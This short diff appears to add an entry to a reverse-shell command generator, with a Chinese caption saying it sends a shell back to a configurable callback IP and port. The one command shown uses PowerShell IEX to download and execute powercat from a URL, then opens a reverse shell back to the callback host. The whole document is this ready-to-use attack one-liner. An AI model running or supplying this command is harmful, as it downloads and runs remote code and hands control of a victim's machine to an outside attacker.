@@ -1,0 +1,3 @@
+官方地址：https://github.com/besimorhino/powercat/blob/master/powercat.ps1
+> 反弹shell到callback_ip的callback_port端口（页面右上角可改）
+cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('$downloadurl');powercat -c $callback_ip -p $callback_port -e powershell
